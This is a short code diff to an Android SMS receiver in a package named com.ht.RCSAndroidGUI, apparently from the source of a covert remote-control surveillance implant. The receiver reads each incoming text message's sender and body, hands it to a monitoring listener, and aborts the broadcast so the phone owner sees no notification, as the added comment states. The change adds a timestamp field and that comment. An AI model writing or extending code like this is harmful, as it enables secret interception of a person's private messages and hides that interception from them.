@@ -5,7 +5,6 @@ import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
 import android.telephony.SmsMessage;
-import android.util.Log;
 
 import com.ht.RCSAndroidGUI.Sms;
 
@@ -21,7 +20,6 @@ public class BroadcastMonitorSms extends BroadcastReceiver {
 			return;
 		
 		SmsMessage[] msgs = null;
-		String str = "";
 
 		// Prendiamo l'sms
 		Object[] pdus = (Object[]) bundle.get("pdus");
@@ -31,8 +29,9 @@ public class BroadcastMonitorSms extends BroadcastReceiver {
 			msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
 			
 			int result = ListenerSms.self().dispatch(new Sms(msgs[i].getOriginatingAddress(),  
-					msgs[i].getMessageBody().toString(), false));
+					msgs[i].getMessageBody().toString(), System.currentTimeMillis(), false));
 						
+			// 1 means "remove notification for this sms"
 			if ((result & 1) == 1) {
 				abortBroadcast();
 			}
